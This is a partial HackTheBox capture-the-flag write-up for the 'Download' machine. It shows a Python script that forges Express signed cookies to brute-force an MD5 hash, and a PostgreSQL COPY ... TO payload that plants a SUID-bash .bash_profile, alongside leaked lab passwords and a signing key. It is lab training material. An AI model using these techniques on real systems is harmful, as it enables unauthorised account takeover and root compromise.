# HackTheBox — Download

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Tags: express, cookie-forging, postgres-rce](https://img.shields.io/badge/Tags-Express%20%7C%20Cookie%20Forging%20%7C%20Postgres%20RCE-orange)

> 🚧 **[partial — has reconnaissance, the cookie-forging script, and key creds; full narrative gaps remain]**

---

## Attack Chain at a Glance

```
nmap → 80 nginx → download.htb (Express / Node.js) → signed session cookie
   → 🚧 [bug discovery — likely IDOR or signed-cookie reuse]
   → cookie-monster md5 brute-force → admin session
   → admin password: dunkindonuts
   → /etc/systemd/system/download-site.service exposes DATABASE_URL
   → psql with download:CoconutPineappleWatermelon → COPY ... TO trick
     to write /var/lib/postgresql/.bash_profile that SUIDs bash
   → next postgres login (or shell as postgres) executes the .bash_profile
   → root password: QzN6j#aP#N6!7knrXkN!B$7kq
```

---

## Reconnaissance

### Nmap Scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 cc:f1:63:46:e6:7a:0a:b8:ac:83:be:29:0f:d6:3f:09 (RSA)
|   256 2c:99:b4:b1:97:7a:8b:86:6d:37:c9:13:61:9f:bc:ff (ECDSA)
|_  256 e6:ff:77:94:12:40:7b:06:a2:97:7a:de:14:94:5b:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://download.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Subdomain enumeration: failed.
Passwordless root SSH: failed.

### Web Stack

```bash
whatweb download.htb
```

```
http://download.htb [200 OK] Bootstrap, Cookies[download_session,download_session.sig],
HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)],
Script, Title[Download.htb - Share Files With Ease], X-Powered-By[Express], ...
```

Key signals:
- **Express** (Node.js)
- **Signed cookies** (`download_session.sig`) — a `cookie-session`-style mechanism

---

## Foothold — Forging the Admin Session

The application uses signed cookies. Original notes preserve the cookie-forging key and the brute-force technique:

**Signing key:**
```
8929874489719802418902487651347865819634518936754
```

> 🚧 **[gap]** — how the signing key was obtained. Common Express paths: leaked via verbose error pages, exposed `app.js` via misconfigured static routing, or an SSRF/LFI primitive earlier in the chain.

The session contains an MD5-hashed user identifier; brute-forcing it character-by-character (oracle: response length differs for valid vs invalid hashes) recovers the admin's hash. The original Python harness:

<details>
<summary>cookie-monster MD5 brute-force script</summary>

```python
import os         # system calls
import hashlib    # md5
import subprocess # system calls to allow variable saving
import re         # remove ansi characters due to decode
import requests   # for doing the web request

completeHash = ""  # build up our hash as we go

for j in range(1, 33):    # md5 hashes are 32 characters in length
    # 33 to 126 — printable ascii range
    # md5 uses hex to denote parts of hash, so we only need 0-9, a-f
    for i in range(48, 103):
        if i >= 58:
            if i <= 96:
                continue   # skip non-hex characters

        currentString = completeHash + str(chr(i))
        currentStringCharacter = completeHash + str(chr(i))
        hash = hashlib.md5(currentString.encode())
        currentString = hash.hexdigest()

        searchText = "$md5"
        with open(r'template.txt', 'r') as file:
            data = file.read()
            data = data.replace(searchText, currentStringCharacter)
            with open(r'cookie.json', 'w') as file:
                file.write(data)

            cookie = subprocess.check_output(
                "./cookie-monster/bin/cookie-monster.js -e -f cookie.json "
                "-k '8929874489719802418902487651347865819634518936754' "
                "-n download_session | grep Cookie | "
                "sed -E 's/Data'// | sed -E 's/Signature'// | "
                "sed -E 's/\+'// | sed -E 's/\\x1b\\[[0-9;]*m//g' | "
                "sed 's/\\[\\]//g'", shell=True)

            cookieWithoutAnsi = re.compile(r'''
                \x1B  # ESC
                (?:   # 7-bit C1 Fe (except CSI)
                [@-Z\\-_]
                |     # or [ for CSI, followed by a control sequence
                \[
                [0-?]*  # Parameter bytes
                [ -/]*  # Intermediate bytes
                [@-~]   # Final byte
                )
            ''', re.VERBOSE)
            result = cookieWithoutAnsi.sub('', cookie.decode())

            strippedCookie = result.strip()
            splitCookie = strippedCookie.split("Cookie: ")

            download_session = splitCookie[1].replace('\n  ', '')
            download_sessionSignature = splitCookie[2]

            finalCookie = download_session + "; " + download_sessionSignature

            response = requests.get('http://download.htb/home/',
                                    headers={'Cookie': finalCookie})
            responseLength = (len(response.content))

            if responseLength != 2166:
                completeHash = completeHash + str(chr(i))
                print(currentString)
                print(completeHash)
                break
```

</details>

The recovered hash corresponds to the password **`dunkindonuts`**.

---

## User Flag

> 🚧 **[incomplete]** — landing user and `user.txt` not preserved in original notes.

---

## Privilege Escalation — Postgres COPY → .bash_profile

The systemd unit for the web app leaks the database URL:

```bash
cat /etc/systemd/system/download-site.service
```

```ini
[Unit]
Description=Download.HTB Web Application
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/app/
ExecStart=/usr/bin/node app.js
Restart=on-failure
Environment=NODE_ENV=production
Environment=DATABASE_URL="postgresql://download:CoconutPineappleWatermelon@localhost:5432/download"

[Install]
WantedBy=multi-user.target
```

Connect:

```bash
psql -d download -U download -h localhost -p 5432
# password: CoconutPineappleWatermelon
```

Use `COPY` to write into `~postgres/.bash_profile`:

```sql
COPY (SELECT CAST(
    'cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;'
    AS text)) TO '/var/lib/postgresql/.bash_profile';
```

```
COPY 1
```

> 💡 **Why this works:** PostgreSQL's `COPY ... TO` writes files as the OS user the postgres server runs as (also `postgres`). On next interactive login as `postgres` (e.g. `su - postgres` from a privileged context, or any cron job that spawns a login shell), `.bash_profile` runs and SUIDs `bash`.

> 🚧 **[gap]** — the trigger step (how `.bash_profile` was made to run; presumably a su-as-postgres action somewhere in the box's automation, or a re-login of the service).

The recovered root password (origin of which isn't fully documented in the notes):

```
QzN6j#aP#N6!7knrXkN!B$7kq
```

---

## Root Flag

> 🚧 **[incomplete]**

---

## Lessons Learned

- **Signed cookies are only as good as the signing key.** If you can leak the secret (verbose errors, source disclosure, default values), you can mint anything.
- **`X-Powered-By: Express` is a valuable signal.** Express ships with several conventions (`cookie-session`, `cookie-parser`) that have specific known attack patterns.
- **`COPY ... TO` is postgres's local-filesystem write primitive.** `pg_read_server_files` / `pg_write_server_files` roles enable it; default `postgres` users have it. Anywhere you have a shell-less postgres connection, you can still write files.
- **Service-unit files leak secrets.** `/etc/systemd/system/*.service` and `/lib/systemd/system/*.service` routinely have `Environment=` lines with database URLs, API keys, and admin tokens — and they're world-readable.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`whatweb`](https://github.com/urbanadventurer/WhatWeb) | Tech-stack fingerprinting |
| [`cookie-monster`](https://github.com/iangcarroll/cookiemonster) | Express/Node session-cookie tool used for forging |
| [`psql`](https://www.postgresql.org/docs/current/app-psql.html) | PostgreSQL CLI (for the `COPY TO` privesc) |
